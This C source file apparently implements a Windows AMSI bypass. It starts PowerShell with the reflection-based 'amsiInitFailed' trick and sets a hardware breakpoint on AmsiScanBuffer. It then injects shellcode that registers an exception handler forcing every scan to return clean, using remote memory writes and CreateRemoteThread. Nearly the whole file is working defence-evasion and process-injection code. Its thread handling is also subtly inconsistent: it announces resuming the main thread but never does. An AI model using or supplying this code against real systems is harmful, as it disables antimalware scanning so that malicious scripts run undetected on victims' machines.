#include <windows.h>
#include <stdio.h>

BOOL CreateProc(PROCESS_INFORMATION* Pi) {
    STARTUPINFOEXW SiEx = { 0 };
    SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXW);

    WCHAR StartupArgs[] = L"powershell.exe -NoProfile -NoExit -Command \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\"";
    size_t currentLen = lstrlenW(StartupArgs);

    if (!CreateProcessW(NULL, StartupArgs, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, NULL, NULL, &SiEx.StartupInfo, Pi)) {
        printf("[!] CreateProcessW Failed: %d\n", GetLastError());
        return FALSE;
    } 

    return TRUE;
}

int main(int argc, char** argv) {
    /*
        Objective: prevent Powershell.exe from executing: amsi.dll!AmsiScanBuffer
    */

    PROCESS_INFORMATION Pi = {0};

    if (!CreateProc(&Pi)) {
        printf("[!] Failed to create process\n");
        return -1;
    }
    printf("[*] Process created in suspended state ! PID : %d\n", Pi.dwProcessId);

    // 1. Load amsi.dll locally to get the function's address
    // Note: amsi.dll will be mapped to the same address in PowerShell
    HMODULE hLocalAmsi = LoadLibraryA("amsi.dll");
    if (!hLocalAmsi) {
        printf("[!] Failed to load amsi.dll locally: %d\n", GetLastError());
        return -1;
    }

    PVOID pRemoteAmsiScanBuffer = (PVOID)GetProcAddress(hLocalAmsi, "AmsiScanBuffer");
    if (!pRemoteAmsiScanBuffer) {
        printf("[!] Failed to find AmsiScanBuffer: %d\n", GetLastError());
        return -1;
    }

    printf("[+] AmsiScanBuffer resolved at: 0x%p\n", pRemoteAmsiScanBuffer);

    // 2. Place a HWBP on the function's entrypoint
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (!GetThreadContext(Pi.hThread, &ctx)) {
        printf("[!] GetThreadContext failed: %d\n", GetLastError());
        return FALSE;
    }

    ctx.Dr0 = (DWORD64)pRemoteAmsiScanBuffer; // HWBP on the function's entrypoint

    /* DR7 Configuration:
       Bit 0  : L0 (Local Breakpoint for DR0) -> Set to 1
       Bit 16 : Type for DR0 (00 = Execute)   -> Set to 0
       Bit 18 : Size for DR0 (00 = 1 byte)    -> Set to 0
    */
    ctx.Dr7 |= (1 << 0);   // Activate L0
    ctx.Dr7 &= ~(1 << 16); // Ensure execution (not Read/Write)
    ctx.Dr7 &= ~(1 << 17);
    
    if (!SetThreadContext(Pi.hThread, &ctx)) {
        printf("[!] SetThreadContext failed: %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] HWBP placed at 0x%p w/ DR0\n", pRemoteAmsiScanBuffer);

    //3. Inject the VEH handler in the remote process

    // Minimal shellcode for the Vectored Handler (x64)
    /*
        The Handle receive as 1st arg : ptr to EXCEPTION_POINTERS
            EXCEPTION_POINTERS {
                EXCEPTION_RECORD* ExceptionRecord; // +0
                CONTEXT* ContextRecord;            // +8
            }
        
        ASM stub steps : 
            - Take the CONTEXT struct from the EXCEPTION_POINTERS+0x8 
            - Check if RIP is at our AmsiScanBuffer address
            - If yes, set retvalue (RAX of ctx) to 0 (AMSI_RESULT_CLEAN), If no jmp to the end of the stub to return EXCEPTION_CONTINUE_SEARCH
            - Then set the ctx's RIP to the retaddr (on top of RSP)
            - and say "continue execution" (return 0xffffffff)
    */
    unsigned char vehStub[] = {
        0x48, 0x8B, 0x51, 0x08,                                             // mov rdx, [rcx + 8]       (ptr to CONTEXT)
        0x48, 0x8B, 0x82, 0xF8, 0x00, 0x00, 0x00,                           // mov rax, [rdx + 0xF8]    (ctx->RIP)
        0x49, 0xBB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,         // mov r11, addr            (offset 13)
        0x4C, 0x39, 0xD8,                                                   // cmp rax, r11
        0x75, 0x2A,                                                         // jne rip+2A               (xor eax, eax...)

        0x48, 0xC7, 0x82, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // mov rax, 0               (AMSI_RESULT_CLEAN) -> [rdx+78] (RAX of ctx)
        0x48, 0x8B, 0x82, 0x98, 0x00, 0x00, 0x00,                           // mov rax, [rdx+98]        (ctx's RSP)
        0x48, 0x8B, 0x00,                                                   // mov rax, [rax]           (RetAddr of amsiscanbuffer)
        0x48, 0x89, 0x82, 0xF8, 0x00, 0x00, 0x00,                           // mov [rdx+F8], rax        (RIP = RetAddr)
        0x48, 0x83, 0x82, 0x98, 0x00, 0x00, 0x00, 0x08,                     // add [rdx+98], 8          (RSP += 8)
        0xB8, 0xFF, 0xFF, 0xFF, 0xFF,                                       // mov eax, 0xffffffff      (EXCEPTION_CONTINUE_EXECUTION)
        0xC3,                                                               // ret

        // RIP check jne target (if not AmsiScanBuffer) -> return CONTINUE_SEARCH
        0x31, 0xC0,                                                         // xor eax, eax             (EXCEPTION_CONTINUE_SEARCH)
        0xC3                                                                // ret
    };
    
    *(PVOID*)(vehStub + 13) = pRemoteAmsiScanBuffer; // Patch the address of AmsiScanBuffer in the shellcode

    PVOID pRemoteHandler = VirtualAllocEx(Pi.hProcess, NULL, sizeof(vehStub), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemoteHandler) return FALSE;
    WriteProcessMemory(Pi.hProcess, pRemoteHandler, vehStub, sizeof(vehStub), NULL);

    printf("[+] VEH handler injected at: 0x%p\n", pRemoteHandler);

    PVOID pAddVEH = GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlAddVectoredExceptionHandler");
    // Note: RtlAddVectoredExceptionHandler(ULONG First, PVECTORED_EXCEPTION_HANDLER Handler)
    unsigned char wrapperStub[] = {
        0x48, 0xC7, 0xC1, 0x01, 0x00, 0x00, 0x00,                   // mov rcx, 1 (First = TRUE)   argv[1]
        0x48, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rdx, [pRemoteHandler]   argv[2]  (offset 9)
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, [RtlAddVEH]                 (offset 19)

        0x48, 0x83, 0xEC, 0x28,                                     // sub rsp, 40  (32(shadow) + 8(padding) + 8(return address of following call) = 48 (%16==0) )
        0xFF, 0xD0,                                                 // call rax
        0x48, 0x83, 0xC4, 0x28,                                     // add rsp, 40
        0xC3                                                        // ret
    };

    *(PVOID*)(wrapperStub + 9) = pRemoteHandler;
    *(PVOID*)(wrapperStub + 19) = pAddVEH;

    PVOID pRemoteWrapperStub = VirtualAllocEx(Pi.hProcess, NULL, sizeof(wrapperStub), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemoteWrapperStub) return FALSE;
    WriteProcessMemory(Pi.hProcess, pRemoteWrapperStub, wrapperStub, sizeof(wrapperStub), NULL);

    printf("[+] Wrapper stub injected at: 0x%p\n", pRemoteWrapperStub);

    // Here we register the handler in the first position (First = 1)
    HANDLE hThread = CreateRemoteThread(Pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteWrapperStub, NULL, 0, NULL);
    ResumeThread(hThread); // Resume the main thread to trigger the VEH registration (and not the HWBP)

    printf("[*] Remote thread created to register the VEH handler !\n");

    if (hThread) {
        printf("[*] Waiting for the remote thread to finish registering the VEH handler...\n");
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }

    printf("[*] Resuming main thread of the process...\n");

    WaitForSingleObject(Pi.hProcess, INFINITE);

    CloseHandle(Pi.hThread);
    CloseHandle(Pi.hProcess);
    
    return 0;
}